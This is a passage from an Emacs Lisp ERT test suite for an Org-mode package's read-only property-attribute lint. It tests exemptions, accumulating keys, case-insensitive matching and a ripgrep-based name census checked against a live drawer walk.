            (cl-incf parsed))
          (forward-line 1))
        (should (= 3 parsed))))))

(ert-deftest org-agents-test-check-attributes-clean-run-says-so ()
  "A run with nothing to report says so in the buffer, not only in passing.
A command that popped an empty buffer would look broken, and the counts
are what say the run really looked at something: a scope that resolved to
no file at all reads as clean otherwise."
  (org-agents-test--with-attr-corpus org-agents-test--registry-example
      '(("a.org" . "\
* Entry
:PROPERTIES:
:ID: 11111111-1111-1111-1111-111111111111
:STATUS: open wip
:REVIEWS: 3
:OPEN: true
:END:
"))
    (org-agents-check-attributes files)
    (should-not (org-agents-test--attr-finding-lines))
    (let ((text (string-join (org-agents-test--attr-report-lines) "\n")))
      (should (string-match-p "no findings" text))
      ;; The counts, because a clean report over nothing is not a clean run.
      (should (string-match-p "1 file in scope" text))
      (should (string-match-p "1 entry" text))
      (should (string-match-p "3 declarations" text))
      ;; And FILES-READ, which is new and is the honest half of a two-tier
      ;; run: the vocabulary question is answered by ripgrep over every
      ;; file in scope, and only the DECLARED names' files are opened.  A
      ;; run that read every file says so by this equalling the scope
      ;; count; a run against an empty registry reads none, and saying "1
      ;; file, 1 entry" there would be claiming a walk that did not happen.
      (should (string-match-p "1 read" text)))
    ;; The same corpus over a scope with a ROOT, which is what takes the
    ;; fast path.  The clean line must still be a clean line there, and
    ;; must not print a different vocabulary of counts.
    (org-agents-check-attributes 'all)
    (should-not (org-agents-test--attr-finding-lines))
    (let ((text (string-join (org-agents-test--attr-report-lines) "\n")))
      (should (string-match-p "no findings" text))
      (should (string-match-p "1 file in scope" text))
      (should (string-match-p "3 declarations" text)))))

(ert-deftest org-agents-test-check-attributes-never-edits ()
  "The corpus comes out byte for byte as it went in, and unmodified.
This is a lint.  It reads a drawer line, says what is wrong with it, and
touches nothing -- so a normalisation that looked like a kindness would
be a command rewriting a corpus nobody asked it to rewrite."
  (org-agents-test--with-attr-corpus org-agents-test--registry-example
      org-agents-test--attr-findings-corpus
    (let ((before (mapcar (lambda (file)
                            (with-temp-buffer
                              (insert-file-contents file)
                              (buffer-string)))
                          files)))
      (org-agents-check-attributes files)
      (should (equal before
                     (mapcar (lambda (file)
                               (with-temp-buffer
                                 (insert-file-contents file)
                                 (buffer-string)))
                             files)))
      (dolist (file files)
        (when-let* ((buffer (find-buffer-visiting file)))
          (should-not (buffer-modified-p buffer)))))))

(ert-deftest org-agents-test-check-attributes-exempts-org-own-properties ()
  "Org's own vocabulary, and this package's, are never asked about.
Without the exemptions this entry alone yields seven findings, and the
author's corpus yields about thirty-seven thousand: `ID' is in neither
`org-special-properties' nor `org-default-properties' and was MEASURED at
36,991 uses, and `ARCHIVE_TIME' at 21,572.  `ATTR_' matters for a
different reason -- the registry commonly lives inside the scope being
checked, and would otherwise report every one of its own declarations."
  (org-agents-test--with-attr-corpus org-agents-test--registry-example
      '(("a.org" . "\
* Entry
:PROPERTIES:
:ID: 11111111-1111-1111-1111-111111111111
:CATEGORY: notes
:CUSTOM_ID: entry
:ARCHIVE_TIME: 2020-01-01 Wed 10:00
:AGENT_QUERY: (todo)
:ATTR_TYPE: string
:STATUS_ALL: open wip
:END:
* Lower case
:PROPERTIES:
:id: 22222222-2222-2222-2222-222222222222
:category: notes
:archive_time: 2020-01-01 Wed 10:00
:custom_id: lower
:END:
* Accumulated
:PROPERTIES:
:STATUS_ALL: open wip
:STATUS_ALL+: done
:ID+: 33333333-3333-3333-3333-333333333333
:ARCHIVE_TIME+: 2021-01-01 Fri 10:00
:CATEGORY+: more
:END:
"))
    (org-agents-check-attributes files)
    (should-not (org-agents-test--attr-finding-lines))))

(ert-deftest org-agents-test-check-attributes-exemption-survives-a-plus ()
  "An exempt name is exempt in its ACCUMULATING spelling too.
`+' is how Org spells an addition to a value, not part of the name being
added to: `:STATUS_ALL+: done' extends the vocabulary of `STATUS' the
ordinary Org way, and `:ID+:' adds to an `ID'.  Testing the exemption on
the raw drawer key instead of on the name loses every exemption in that
spelling: MEASURED, `org-agents--attr-exempt-p' answered t for
`STATUS_ALL' and nil for `STATUS_ALL+', so the lint reported `STATUS_ALL'
-- the vocabulary as a violation of itself, which is the one thing the
`_ALL' clause exists to prevent -- and `ID' and `ARCHIVE_TIME' with it,
the two exemptions worth about 58,000 suppressed findings on the author's
corpus."
  (org-agents-test--with-attr-corpus org-agents-test--registry-example
      '(("a.org" . "\
* Entry
:PROPERTIES:
:STATUS_ALL: open wip
:STATUS_ALL+: done
:ID+: 11111111-1111-1111-1111-111111111111
:END:
* Undeclared
:PROPERTIES:
:WIDGET+: z
:END:
"))
    ;; At the level the stripping happens: the accumulating spelling of an
    ;; exempt name is no finding, and of an undeclared one still is.
    (dolist (key '("STATUS_ALL+" "ID+" "ARCHIVE_TIME+" "CATEGORY+"))
      (should-not (org-agents--attr-line-finding key "x" (lambda (_) nil))))
    (should (org-agents--attr-line-finding "WIDGET+" "z" (lambda (_) nil)))
    (org-agents-check-attributes files)
    (let ((lines (org-agents-test--attr-finding-lines)))
      ;; The exempt accumulations are silent; the undeclared one on a `+'
      ;; line is still found, and under its NAME rather than its key --
      ;; which is what says the walk did reach these lines at all.
      (should (= 1 (length lines)))
      (should (string-match-p (format "\\`%s:9: " (regexp-quote (car files)))
                              (car lines)))
      (should (string-match-p "WIDGET is not declared" (car lines))))))

(ert-deftest org-agents-test-check-attributes-walks-a-file-level-drawer ()
  "A property drawer before the first heading is walked like any other.
It is a real property block: MEASURED, `org-entry-get' at `point-min'
answers `x' for a `:WIDGET: x' written there, and with
`org-use-property-inheritance' on every entry in the file sees those
values.  A lint that skipped it would call such a file clean -- and
credit it with an entry while doing so -- with a misspelled name and an
unparseable value sitting at the top of it.

Counted as no entry, because it is none: the counts in the clean line
say how many HEADINGS were looked at."
  (org-agents-test--with-attr-corpus org-agents-test--registry-example
      '(("a.org" . "\
:PROPERTIES:
:WIDGET: x
:REVIEWS: many
:END:
#+TITLE: Per-file defaults

* Entry
:PROPERTIES:
:STATUS: open
:END:
"))
    ;; Org really does read those, which is what makes them worth linting.
    (with-current-buffer (find-file-noselect (car files))
      (goto-char (point-min))
      (should (equal "x" (org-entry-get nil "WIDGET"))))
    (org-agents-check-attributes files)
    (let ((lines (org-agents-test--attr-finding-lines)))
      (should (= 2 (length lines)))
      (should (string-match-p (format "\\`%s:2: " (regexp-quote (car files)))
                              (nth 0 lines)))
      (should (string-match-p "WIDGET is not declared" (nth 0 lines)))
      (should (string-match-p (format "\\`%s:3: " (regexp-quote (car files)))
                              (nth 1 lines)))
      (should (string-match-p "REVIEWS" (nth 1 lines)))
      (should (string-match-p "is not a number" (nth 1 lines))))))

(ert-deftest org-agents-test-check-attributes-set-repeat-across-lines ()
  "A `set' that repeats a member across `+' lines is reported.
A repeat is the one rule that distinguishes a `set' from a `list', and it
is a thing no single line can show: `:STATUS: open' beside a `:STATUS+:
open' is `open open', which `org-agents-attribute-valid-p' rejects for a
set and accepts for a list.  Judging only the accumulating line's own
fragment left the rule unenforced whenever the value was spelled across
lines, and a later epic writing such a set back would write a duplicate
the lint had blessed."
  (should-not (org-agents-attribute-valid-p 'set "open open"
                                            '("open" "wip")))
  (org-agents-test--with-attr-corpus org-agents-test--registry-example
      '(("a.org" . "\
* Repeats
:PROPERTIES:
:STATUS: open
:STATUS+: open
:END:
"))
    (org-agents-check-attributes files)
    (let ((lines (org-agents-test--attr-finding-lines)))
      (should (= 1 (length lines)))
      ;; On the `+' line that made it a repeat, as every accumulation
      ;; finding is: the earlier line was fine until this one arrived.
      (should (string-match-p (format "\\`%s:4: " (regexp-quote (car files)))
                              (car lines)))
      (should (string-match-p "open open" (car lines)))
      (should (string-match-p "is not a set" (car lines)))))
  ;; Two DISTINCT members across the same two lines are a set, and say
  ;; nothing -- which is what keeps the check above from being a report of
  ;; accumulation itself.
  (org-agents-test--with-attr-corpus org-agents-test--registry-example
      '(("a.org" . "\
* Distinct
:PROPERTIES:
:STATUS: open
:STATUS+: wip
:END:
"))
    (org-agents-check-attributes files)
    (should-not (org-agents-test--attr-finding-lines))))

(ert-deftest org-agents-test-check-attributes-reads-the-registry-once ()
  "The registry is read -- and its cache KEY computed -- once per run.
The hit itself is one `equal', but the key it is compared against costs a
`file-truename' and a `find-buffer-visiting', and the second walks the
whole buffer list and truenames each buffer's file name.  The lint asks
for a declaration once per drawer line, after visiting every file in
scope, so a key computed per look-up makes the command quadratic in the
corpus: MEASURED, 200 files of 20 entries took 4.43 s against 1.57 s, and
600 files 33.93 s against 4.96 s -- tripling the corpus cost the memoized
version 3.2x and the other 7.7x, which is the quadratic term showing.

Asserted as a COUNT rather than as a duration, and asserted twice over: a
corpus with six times the property lines must cost the same one key."
  (let ((keys 0)
        (real (symbol-function 'org-agents--file-cache-key)))
    (cl-letf (((symbol-function 'org-agents--file-cache-key)
               (lambda (&rest args) (cl-incf keys) (apply real args))))
      (org-agents-test--with-attr-corpus org-agents-test--registry-example
          '(("a.org" . "\
* Entry
:PROPERTIES:
:STATUS: open
:REVIEWS: 3
:END:
"))
        (org-agents-check-attributes files)
        (should (= 1 keys)))
      (setq keys 0)
      (org-agents-test--with-attr-corpus org-agents-test--registry-example
          '(("a.org" . "\
* Entry
:PROPERTIES:
:STATUS: open
:REVIEWS: 3
:OPEN: true
:WIDGET: x
:END:
* Another
:PROPERTIES:
:STATUS: wip
:REVIEWS: 4
:OPEN: false
:GADGET: y
:END:
")
            ("b.org" . "\
* Third
:PROPERTIES:
:STATUS: done
:REVIEWS: 5
:OPEN: true
:DOODAD: z
:END:
"))
        (org-agents-check-attributes files)
        (should (= 1 keys))))))

(ert-deftest org-agents-test-check-attributes-accumulated-and-lower-case-keys ()
  "A key is looked up as Org looks one up, and an accumulation is named.
Two things Org does that a naive walk gets wrong, both MEASURED against
one drawer.  A key matches case-insensitively, so `:status: open' is a
value of the declared `STATUS' and not an undeclared property.  And a `+'
line ACCUMULATES: `org-entry-get' answers `3 4' for a `:REVIEWS: 3'
beside a `:REVIEWS+: 4', and `3 4' is not a number -- so the finding is
real, and it belongs on the line that caused it rather than on the line
that was fine until that one arrived."
  (org-agents-test--with-attr-corpus org-agents-test--registry-example
      '(("a.org" . "\
* Entry
:PROPERTIES:
:status: open
:REVIEWS: 3
:REVIEWS+: 4
:END:
"))
    (org-agents-check-attributes files)
    (let ((lines (org-agents-test--attr-finding-lines)))
      (should (= 1 (length lines)))
      (should (string-match-p (format "\\`%s:5: " (regexp-quote (car files)))
                              (car lines)))
      (should (string-match-p "REVIEWS" (car lines)))
      (should (string-match-p "3 4" (car lines)))
      (should (string-match-p "is not a number" (car lines))))))

(ert-deftest org-agents-test-check-attributes-scope-vocabulary ()
  "The four scope spellings an agent takes, each reaching the same corpus.
Read by the very same `org-agents--read-scope' an agent's
`:AGENT_SCOPE:' goes through, so the two vocabularies cannot drift."
  (org-agents-test--with-attr-corpus org-agents-test--registry-example
      org-agents-test--attr-findings-corpus
    (dolist (scope (list 'agenda 'all 'active files
                         (org-agents--read-scope "agenda")
                         (org-agents--read-scope (format "%S" files))))
      (org-agents-check-attributes scope)
      (let ((lines (org-agents-test--attr-finding-lines)))
        (should (= 3 (length lines)))
        (should (string-match-p "WIDGET" (nth 2 lines)))))
    ;; And a directory relative to `org-directory', which is the one
    ;; spelling `org-agenda-files' could not answer for.
    (make-directory (expand-file-name "sub" dir) t)
    (with-temp-file (expand-file-name "sub/c.org" dir)
      (insert "* Sub\n:PROPERTIES:\n:GADGET: y\n:END:\n"))
    (org-agents-check-attributes (org-agents--read-scope "sub"))
    (let ((lines (org-agents-test--attr-finding-lines)))
      (should (= 1 (length lines)))
      (should (string-match-p "GADGET" (car lines))))))

(ert-deftest org-agents-test-check-attributes-corpus-scope-never-refuses ()
  "A corpus scope falls back to a live scan, and `require' has nothing to
refuse.
The pattern this command pushes is `org-agents--rg-drawer-pattern', a
provable SUPERSET of the files that could hold a finding, and it is
always there -- so the branch that raises a `user-error' under
`org-agents-prefilter' set to `require' is unreachable from here.  Which
is the point: an agent may be told its query cannot be answered
affordably, but a lint that refused to run would fail its own contract.

Absent ripgrep the scan is live, with one message naming the count,
exactly as an agent's is."
  (org-agents-test--with-attr-corpus org-agents-test--registry-example
      org-agents-test--attr-findings-corpus
    (let ((org-agents-rg-executable "no-such-program-xyzzy"))
      (let* ((msgs (org-agents-test--messages
                     (org-agents-check-attributes 'all)))
             (ours (cl-remove-if-not
                    (lambda (m) (string-match-p "not narrowed" m)) msgs)))
        (should (= 3 (length (org-agents-test--attr-finding-lines))))
        (should (= 1 (length ours)))
        (should (string-match-p "ripgrep not found" (car ours)))
        (should (string-match-p "scanning 1 files live" (car ours))))
      ;; And `require' does not signal, because there is a pattern to push.
      (let ((org-agents-prefilter 'require))
        (org-agents-check-attributes 'all)
        (should (= 3 (length (org-agents-test--attr-finding-lines))))))))

(ert-deftest org-agents-test-check-attributes-unreadable-file-does-not-abort ()
  "A file that cannot be opened costs that file, not the whole run.
The other file's findings are reported and the bad one is named, on a
line of the same navigable shape -- so the report says what it could not
read rather than quietly reading less than it was asked to."
  (org-agents-test--with-attr-corpus org-agents-test--registry-example
      '(("a.org" . "\
* Entry
:PROPERTIES:
:WIDGET: x
:END:
")
        ("bad.org" . "* Entry\n"))
    (let ((bad (nth 1 files))
          (real (symbol-function 'find-file-noselect)))
      (cl-letf (((symbol-function 'find-file-noselect)
                 (lambda (file &rest args)
                   (if (equal (file-truename file) (file-truename bad))
                       (error "Opening `%s': bad coding system" file)
                     (apply real file args)))))
        (org-agents-check-attributes files))
      (let ((lines (org-agents-test--attr-finding-lines)))
        (should (= 2 (length lines)))
        (should (string-match-p "WIDGET" (car lines)))
        (should (string-match-p "bad\\.org" (nth 1 lines)))
        (should (string-match-p "bad coding system" (nth 1 lines)))))))


;;;; The attribute lint's two tiers

;; `org-agents-check-attributes' asks two questions and used to pay
;; per-entry Org-parsing cost for both, which is why it could not finish
;; over a real corpus: MEASURED, killed at 600 s with no report at all.
;; "Which property names are in use that nothing declares?" needs no Org
;; semantics -- it is a question about text -- so it is answered by ONE
;; ripgrep run.  "Do declared values match their declared type?" genuinely
;; needs per-entry reading, but only for the handful of DECLARED names.
;;
;; The whole risk of the split is that the two enumerators could report
;; different vocabularies, and `org-agents-test-attr-census-fast-equals-slow'
;; is the test that says they do not.

(defconst org-agents-test--attr-census-corpus
  '(("plain.org" . "\
* Ordinary entry
:PROPERTIES:
:WIDGET: x
:END:
")
    ("filelevel.org" . "\
:PROPERTIES:
:FILEWIDE: y
:END:
* A heading after it
")
    ("case.org" . "\
* Lower case key
:PROPERTIES:
:widget: lower
:END:
")
    ("accum.org" . "\
* Accumulating
:PROPERTIES:
:GADGET: one
:GADGET+: two
:END:
")
    ("valueless.org" . "\
* No value at all
:PROPERTIES:
:SPROCKET:
:END:
")
    ("notdrawers.org" . "\
* Other packages' drawers
:PROPERTIES:
:REALONE: yes
:END:
:LOGBOOK:
CLOCK: [2020-01-01 Wed 10:00]--[2020-01-01 Wed 11:00] =>  1:00
:END:
:RESULTS:
some output
:END:
:bodykey: bodyvalue
* A body drawer Org does not read
Some text first, so what follows is not a property drawer.
:PROPERTIES:
:BURIED: nope
:END:
")
    ("colon.org" . "\
* A name with a colon in it
:PROPERTIES:
:A:B: z
:END:
"))
  "Every case that could separate the ripgrep census from the live walk.
Each file defends something specific, and the whole point of collecting
them here is that `org-agents-test-attr-census-fast-equals-slow' runs the
SAME corpus through both enumerators:

  plain.org       the base case.
  filelevel.org   a drawer BEFORE the first heading, which Org really does
                  read -- `org-agents-test-check-attributes-walks-a-file-level-drawer'
                  is the live path's version of this.
  case.org        a lower-case key, which Org matches case-insensitively,
                  so the census must fold it the same way.
  accum.org       a `+' key, whose name is the key without the `+'.
  valueless.org   a key with NOTHING after it.  The name is in use even
                  with no value to judge, so a census pattern that
                  required a value would UNDER-REPORT -- the one direction
                  that matters.
  notdrawers.org  three property-line SHAPES that are not properties: a
                  `:LOGBOOK:' opener, a `:RESULTS:' opener, a `:bodykey:'
                  line in body text, and a `:PROPERTIES:' drawer written
                  after body text where `org-get-property-block' does not
                  read it.  MEASURED on the author's corpus, `LOGBOOK'
                  alone is 1,407 sites -- so without the confirmation pass
                  the fast path invents attribute names.
  colon.org       `:A:B: z' is the property `A:B' to Org, whose key
                  pattern is the greedy `\\S-+'.  A census pattern spelling
                  the key as a letter class truncates it to `A' and
                  reports a name nobody wrote.

The latin-1 and CRLF cases cannot be written as text here and are built
with explicit coding systems in the test itself.")

(defun org-agents-test--attr-undeclared-names ()
  "The set of names the current report calls undeclared, sorted.
The findings' TEXT, not their line numbers: the fast path reports one
confirmed example site per name and the slow path reported every line, so
the sets of NAMES are what the two enumerators must agree on and the sets
of lines are not."
  (sort (delete-dups
         (delq nil
               (mapcar (lambda (line)
                         (when (string-match ": \\([^ ]+\\) is not declared"
                                             line)
                           (match-string 1 line)))
                       (org-agents-test--attr-finding-lines))))
        #'string<))

(defun org-agents-test--write-raw (file text coding)
  "Write TEXT to FILE encoded with CODING, and answer FILE."
  (let ((coding-system-for-write coding))
    (with-temp-file file (insert text)))
  file)

(ert-deftest org-agents-test-attr-census-fast-equals-slow ()
  "THE soundness test: the ripgrep census names exactly what the walk does.
The whole risk of splitting this command into two tiers is that its fast
vocabulary enumerator could report a different set of names from the slow
one, and every other test here is about a single case while this one is
about the equivalence itself.

The same corpus is linted twice.  `all' has a ROOT, so it takes the
ripgrep census; an explicit file list names its files, so it takes the
live walk -- the same distinction `org-agents--narrowed-files' already
makes, reused rather than re-derived.  The two reports must name the same
set of undeclared attributes.

Asserted non-empty FIRST, so that a test which stopped exercising anything
cannot pass by comparing nil to nil.

The fixture is `org-agents-test--attr-census-corpus' plus two files that
cannot be written as ordinary text: a latin-1 one, and a CRLF one.  See
`org-agents--rg-census-pattern' for what each of those measured."
  (org-agents-test--with-attr-corpus org-agents-test--registry-example
      org-agents-test--attr-census-corpus
    ;; A latin-1 name.  MEASURED: with the census pattern spelling its key
    ;; `\S+' -- or as a letter class -- this property is LOST ENTIRELY,
    ;; because ripgrep decodes as UTF-8 and the accented byte is not
    ;; matched.  And the name must come back as Emacs decodes it, not as
    ;; the raw bytes ripgrep saw.
    (org-agents-test--write-raw
     (funcall F "latin1.org")
     "* Latin-1 entry\n:PROPERTIES:\n:CAFÉ: x\n:END:\n" 'iso-8859-1)
    ;; A CRLF file.  MEASURED: with `--crlf' every extracted name comes
    ;; back with a trailing CR -- on LF files too -- and without `\r?$' in
    ;; the pattern this file's lines are missed entirely.
    ;; Written with `binary', so the CRs in the text are the bytes on disk
    ;; and nothing else is added.  Written with `utf-8-dos' AND explicit
    ;; CRs the file gets `\r\r\n', which ORG cannot read either -- its
    ;; `:PROPERTIES:\r' line does not match `org-property-start-re', so
    ;; there is no drawer and `org-entry-get' answers nil.  MEASURED, and
    ;; worth recording: the census still finds the key in that file, and
    ;; the CONFIRMATION PASS is what drops it, which is the pass doing
    ;; exactly its job on a case nobody designed it for.
    (org-agents-test--write-raw
     (funcall F "crlf.org")
     "* CRLF entry\r\n:PROPERTIES:\r\n:CARRIAGE: x\r\n:END:\r\n" 'binary)
    (let ((all (append files (list (funcall F "latin1.org")
                                   (funcall F "crlf.org")))))
      ;; Fast: a corpus scope, which has a root and so takes the census.
      (org-agents-check-attributes 'all)
      (let ((fast (org-agents-test--attr-undeclared-names)))
        ;; Slow: an explicit list, which names its files and so walks.
        (org-agents-check-attributes all)
        (let ((slow (org-agents-test--attr-undeclared-names)))
          (should slow)
          (should fast)
          (should (equal fast slow))
          ;; And the set really does hold the cases the fixture is for, so
          ;; that an equivalence of two empty-ish sets cannot pass for one.
          (dolist (name '("FILEWIDE" "GADGET" "SPROCKET" "CAFÉ"
                          "CARRIAGE" "A:B" "REALONE"))
            (should (member name fast)))
          ;; ONE entry for the two spellings of one name: `plain.org' has
          ;; `:WIDGET:' and `case.org' has `:widget:', Org matches keys
          ;; case-insensitively, and the census folds them together.
          (should (= 1 (length (cl-remove-if-not
                                (lambda (n) (equal (upcase n) "WIDGET"))
                                fast))))
          ;; And it is spelled as the ALPHABETICALLY FIRST file spells it,
          ;; which is `case.org'.  That determinism is the point and it was
          ;; a bug: RIPGREP'S OUTPUT ORDER IS NONDETERMINISTIC -- parallel
          ;; walk -- so the confirmed site, and with it the reported
          ;; spelling, varied between runs of the same command.  OBSERVED
          ;; here as an intermittent failure that appeared only under CPU
          ;; load, 1 run in 6, reporting `widget' where the walk reported
          ;; `WIDGET'.  `org-agents--attr-sort-groups' is the fix, applied
          ;; to BOTH producers so that they cannot disagree.
          (should (member "widget" fast))
          (should (member "widget" slow))
          (should-not (member "WIDGET" fast))
          ;; And none of the property-line SHAPES that are not properties.
          (dolist (name '("LOGBOOK" "RESULTS" "PROPERTIES" "END"
                          "bodykey" "BODYKEY" "BURIED"))
            (should-not (member name fast))
            (should-not (member name slow))))))))

(ert-deftest org-agents-test-attr-census-excludes-drawer-delimiters ()
  "`PROPERTIES' and `END' are in the raw census and in neither report.
They are what a text enumerator sees that a drawer walk cannot: the live
walk never meets them at all, because
`org-agents--attr-drawer-findings' walks `org-get-property-block''s range
and that range EXCLUDES both lines.  So they are removed by a variable of
their own, `org-agents--rg-census-delimiters', rather than folded into
`org-agents--attributes-exempt' -- they are an artefact of an enumerator,
not a statement about Org's vocabulary.

MEASURED on the author's corpus, they are the two largest matches the
census produces: `END' 43,277 sites and `PROPERTIES' 41,840.  Asserted at
BOTH levels, because only the pair of assertions says the exclusion is
doing work: present in `org-agents--attr-census-rg''s raw answer, absent
from the report."
  (skip-unless (executable-find "rg"))
  (should (equal '("PROPERTIES" "END") org-agents--rg-census-delimiters))
  (org-agents-test--with-attr-corpus org-agents-test--registry-example
      '(("one.org" . "* E\n:PROPERTIES:\n:WIDGET: x\n:END:\n"))
    (let* ((root (org-agents--scope-root 'all))
           (census (org-agents--attr-census-rg root files))
           (keys (mapcar #'car census)))
      (should (member "PROPERTIES" keys))
      (should (member "END" keys))
      (should (member "WIDGET" keys)))
    (org-agents-check-attributes 'all)
    (let ((names (org-agents-test--attr-undeclared-names)))
      (should (member "WIDGET" names))
      (should-not (member "PROPERTIES" names))
      (should-not (member "END" names)))))

(ert-deftest org-agents-test-attr-census-excludes-org-own-vocabulary ()
  "Org's own property names are exempt on the FAST path as well.
`org-agents-test-check-attributes-exempts-org-own-properties' asserts this
for the live walk; the exemption lives in `org-agents--attributes-exempt',
which is `org-special-properties' and `org-default-properties' plus `ID'
and the six `org-archive-subtree' writes.  A second enumerator that did
not consult it would bury every real finding: MEASURED on the author's
corpus, `ID' is 37,005 sites and `ARCHIVE_TIME' 21,572."
  (skip-unless (executable-find "rg"))
  ;; The two lists really are the source, so the assertion below cannot
  ;; pass because somebody hard-coded these names twice.
  (should (member "CATEGORY" org-agents--attributes-exempt))
  (should (member "ID" org-agents--attributes-exempt))
  (should (member "ARCHIVE_TIME" org-agents--attributes-exempt))
  (should (cl-subsetp org-special-properties org-agents--attributes-exempt
                      :test #'equal))
  (should (cl-subsetp org-default-properties org-agents--attributes-exempt
                      :test #'equal))
  (org-agents-test--with-attr-corpus org-agents-test--registry-example
      '(("one.org" . "\
* E
:PROPERTIES:
:ID: 44444444-4444-4444-4444-444444444444
:ARCHIVE_TIME: 2020-01-01
:CATEGORY: things
:VISIBILITY: folded
:WIDGET: x
:END:
"))
    (dolist (scope (list 'all files))
      (org-agents-check-attributes scope)
      (let ((names (org-agents-test--attr-undeclared-names)))
        (should (equal '("WIDGET") names))))))

(ert-deftest org-agents-test-attr-census-excludes-own-namespaces ()
  "This package's own names, and Org's `_ALL' convention, on the fast path.
`org-agents--attributes-exempt-re' is the rule.  `ATTR_' matters most:
the registry commonly lives INSIDE the scope being linted, and without the
exemption every one of its own declarations is reported as an undeclared
property.  `_ALL' is Org's allowed-values convention -- `STATUS_ALL' is a
declaration ABOUT `STATUS', so reporting it would be reporting the
vocabulary as a violation of itself -- and the `+' form has to be exempt
too, since the exemption is tested on the NAME and not on the raw key."
  (skip-unless (executable-find "rg"))
  (should (equal "\\`\\(?:AGENT_\\|ATTR_\\)\\|_ALL\\'"
                 org-agents--attributes-exempt-re))
  (org-agents-test--with-attr-corpus org-agents-test--registry-example
      '(("one.org" . "\
* E
:PROPERTIES:
:AGENT_QUERY: (todo)
:ATTR_TYPE: string
:STATUS_ALL: open wip
:STATUS_ALL+: done
:WIDGET: x
:END:
"))
    (dolist (scope (list 'all files))
      (org-agents-check-attributes scope)
      (should (equal '("WIDGET") (org-agents-test--attr-undeclared-names))))))

(ert-deftest org-agents-test-attr-census-confirmation-drops-a-non-property ()
  "A property-line SHAPE outside any drawer is dropped, and SAID.
An exclusion list cannot be enough and that is measured rather than
argued: against the whole corpus's live census as ground truth, the
ripgrep census reported four names the walk never sees and no list could
have anticipated -- `LOGBOOK' (1,407 sites), `RESULTS', `SRSITEMS' and a
stray `0'.  They are other packages' drawer openers and stray body lines,
and the next corpus will have different ones.

So each candidate is confirmed by reading a real property drawer.
Asserted at the level of `org-agents--attr-confirm-candidate', because the
report alone cannot distinguish \"confirmed away\" from \"never enumerated\":
the candidate is PRESENT before confirmation and answers nil at it.

And the drop is not silent.  `org-agents--attr-name-findings' counts the
candidates that went unconfirmed, which is the visible cost of
`org-agents--attr-confirm-limit'."
  (skip-unless (executable-find "rg"))
  (org-agents-test--with-attr-corpus org-agents-test--registry-example
      '(("one.org" . "\
* E
:PROPERTIES:
:REALONE: yes
:END:
:LOGBOOK:
CLOCK: [2020-01-01 Wed 10:00]
:END:
:bodykey: bodyvalue
"))
    (let* ((root (org-agents--scope-root 'all))
           (census (org-agents--attr-census-rg root files)))
      ;; Enumerated, all three of them.
      (should (assoc "LOGBOOK" census))
      (should (assoc "BODYKEY" census))
      (should (assoc "REALONE" census))
      ;; And only the real one confirms.
      (should (org-agents--attr-confirm-candidate (assoc "REALONE" census)))
      (should-not (org-agents--attr-confirm-candidate (assoc "LOGBOOK" census)))
      (should-not (org-agents--attr-confirm-candidate (assoc "BODYKEY" census)))
      ;; The count of unconfirmed candidates is reported, not swallowed.
      (pcase-let ((`(,_findings . ,unconfirmed)
                   (org-agents--with-attributes
                     (org-agents--attr-name-findings census t))))
        (should (= 2 unconfirmed))))
    (org-agents-check-attributes 'all)
    (should (equal '("REALONE") (org-agents-test--attr-undeclared-names)))))

(ert-deftest org-agents-test-attr-census-pattern-is-printable-ascii ()
  "The census pattern is printable ASCII, like every other pushed pattern.
Same rule as `org-agents-test-attr-drawer-pattern-is-printable-ascii' and
for the same reason: ripgrep decodes the PATTERN as UTF-8 while Emacs may
decode a FILE as latin-1, so a non-ASCII pattern matches LESS than Org
does -- and for an ENUMERATOR, matching less means reporting a corpus as
cleaner than it is."
  (should (equal org-agents--rg-census-pattern
                 (encode-coding-string org-agents--rg-census-pattern
                                       'us-ascii))))

(ert-deftest org-agents-test-attr-census-args-are-pinned ()
  "The census argument vector, element by element, `--crlf' ABSENT.
Pinned for the reason `org-agents-test-rg-args-pins-the-argument-vector'
gives: five of the under-matches measured while this backend was designed
were a missing flag rather than a wrong pattern.

`--crlf' is the one to notice, and its absence is deliberate and measured.
With `--crlf', a pattern holding `\\r' makes ripgrep REFUSE to run -- `the
literal \"\\r\" is not allowed in a regex' -- and a pattern with a bare `$'
returns every name with a trailing CR appended, on LF files as well as
CRLF ones.  Without `--crlf' and with `\\r?$', both files' names come back
clean.  So the census spells the terminator in the pattern, which is the
opposite of what `org-agents--rg-args' does, and that difference is what
this test exists to keep."
  (should (equal (org-agents--rg-census-args "/corpus")
                 (list "--null" "--line-number" "--with-filename"
                       "--no-heading" "--only-matching" "--replace" "$1"
                       "--text" "--no-ignore" "--hidden" "--follow"
                       "--iglob" "*.org"
                       "--regexp" org-agents--rg-census-pattern
                       "--" "/corpus")))
  (should-not (member "--crlf" (org-agents--rg-census-args "/corpus")))
  ;; `string-search', not a regexp: the pattern IS a regexp, and matching
  ;; its text with another one is two levels of escaping to get wrong.
  (should (string-search "\\r?$" org-agents--rg-census-pattern))
  ;; The traversal flags are carried over from the prefilter UNCHANGED,
  ;; because the census's file set is intersected with the scope's own list
  ;; and a file ripgrep failed to visit is a NAME LOST with no error.
  (dolist (flag '("--text" "--no-ignore" "--hidden" "--follow"))
    (should (member flag (org-agents--rg-census-args "/corpus")))
    (should (member flag (org-agents--rg-args "PAT" "/corpus")))))

(ert-deftest org-agents-test-attr-census-degrades-without-ripgrep ()
  "Absent ripgrep, the lint answers the same names by walking, and never refuses.
The degradation the whole prefilter already promises, extended to the
census: same findings, ONE message, no refusal -- and `org-agents-prefilter'
at `require' still does not signal, because a lint that declined to run
would fail its own contract rather than decline an expense.  See the
REFUSE argument of `org-agents--narrowed-files'.

The registry declares three attributes here, which is the case that would
have produced three \"not narrowed\" messages if the value tier resolved its
own fallback per declared name."
  (org-agents-test--with-attr-corpus org-agents-test--registry-example
      '(("one.org" . "* E\n:PROPERTIES:\n:WIDGET: x\n:STATUS: nope\n:END:\n"))
    (should (= 3 (length (org-agents-attributes))))
    (let (with-rg without-rg msgs)
      (org-agents-check-attributes 'all)
      (setq with-rg (org-agents-test--attr-undeclared-names))
      (let ((org-agents-rg-executable "no-such-program-xyzzy")
            (org-agents-prefilter 'require))
        (setq msgs (org-agents-test--messages
                     (org-agents-check-attributes 'all)))
        (setq without-rg (org-agents-test--attr-undeclared-names)))
      (should (equal '("WIDGET") with-rg))
      (should (equal with-rg without-rg))
      ;; Exactly one, however many declarations the registry holds.
      (should (= 1 (length (cl-remove-if-not
                            (lambda (m) (string-match-p "not narrowed" m))
                            msgs)))))))

(ert-deftest org-agents-test-attr-value-tier-narrows-per-declared-name ()
  "The value tier opens only the files that could hold a declared name.
And the `t'-versus-nil conflation is pinned, which is the trap:
